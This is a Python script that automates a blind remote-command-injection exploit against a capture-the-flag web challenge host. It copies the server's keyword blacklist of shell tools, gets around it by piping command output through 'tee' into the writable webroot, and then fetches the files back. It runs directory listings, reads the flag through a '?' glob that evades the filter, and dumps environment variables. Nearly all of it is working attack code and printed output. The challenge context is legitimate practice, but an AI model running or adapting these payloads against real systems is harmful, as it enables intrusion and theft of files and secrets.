#!/usr/bin/env python3
"""Captain independent verification of the NSSCTF node4:27309 blind-RCE chain.

Every request URL, the filter pre-check and the raw response body are printed,
so the transcript below is copy-paste reproducible. The script only ever
writes files into the webroot (via `tee`), which is the exfil channel itself.
"""
import re
import time
import urllib.parse
import urllib.request

BASE = "http://node4.anna.nssctf.cn:27309/"
BLACKLIST = re.compile(
    r'bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|"|>|<|%|\$',
    re.I,
)
TAG = time.strftime("%H%M%S")


def get(url, timeout=30):
    req = urllib.request.Request(url, headers={"User-Agent": "ctf-captain-verify"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def check(payload):
    """Client-side replay of the server's preg_match."""
    m = BLACKLIST.search(payload)
    return (m is None), (m.group(0) if m else "")


def tail(body):
    """index.php highlight_file()s itself, so judge only the text after </code>."""
    return body.split("</code>")[-1].strip()


def send(payload, label):
    ok, hit = check(payload)
    url = BASE + "?url=" + urllib.parse.quote(payload, safe="")
    body = get(url)
    print("  %s" % label)
    print("    payload      : %r" % payload)
    print("    filter-clean : %s%s" % (ok, "" if ok else "   <- client pre-check hits %r" % hit))
    print("    REQ          : %s" % url)
    print("    resp(tail)   : %r" % tail(body))
    return ok


def exfil(cmd, name, label):
    """cmd | tee <name>  ->  GET /<name>"""
    payload = "%s|tee %s" % (cmd, name)
    if not send(payload, label + " [write via tee]"):
        print("    !! payload would be rejected by the blacklist, not fetching")
        return ""
    print("    GET          : %s%s" % (BASE, name))
    print("    --- raw body ---")
    body = get(BASE + name)
    for line in body.splitlines():
        print("    | %s" % line)
    return body


def main():
    print("### STEP 0 - fingerprint")
    with urllib.request.urlopen(BASE, timeout=30) as r:
        print("    HTTP %s" % r.status)
        for k, v in r.headers.items():
            print("    %s: %s" % (k, v))
    print()

    print("### STEP 1 - control: is exec() output reflected?")
    send("id", "no exfil, output would have to appear in the page if reflected")
    print("    => only 'Can you see anything?' is returned: the bug is BLIND")
    print()

    print("### STEP 2 - prove the out-of-band channel (.webroot is writable)")
    exfil("id", "cap_%s_id.txt" % TAG, "whoami / id")
    print()

    print("### STEP 3 - confirm the cwd of the exec'd child")
    exfil("pwd", "cap_%s_pwd.txt" % TAG, "pwd")
    print()

    print("### STEP 4 - enumerate the filesystem (bare `find` / `dir`, no options)")
    exfil("dir /", "cap_%s_root.txt" % TAG, "dir /")
    print()

    print("### STEP 5 - the decoy breadcrumb")
    exfil("nl /a_here_is_a_f1ag", "cap_%s_decoy.txt" % TAG, "nl /a_here_is_a_f1ag")
    print()

    print("### STEP 6 - the filter rejects the literal flag path")
    send("nl /flag", "literal /flag")
    send("nl /flllllaaaaaaggggggg", "literal real flag path")
    print()

    print("### STEP 7 - same path with the single-char glob `?`")
    exfil("nl /fllll?aaaaaaggggggg", "cap_%s_flag.txt" % TAG, "nl /fllll?aaaaaaggggggg")
    print()

    print("### STEP 8 - env decoy (note: typing the var name is itself blocked)")
    exfil("printenv", "cap_%s_env.txt" % TAG, "printenv")
    print()
    print("### DONE")


if __name__ == "__main__":
    main()
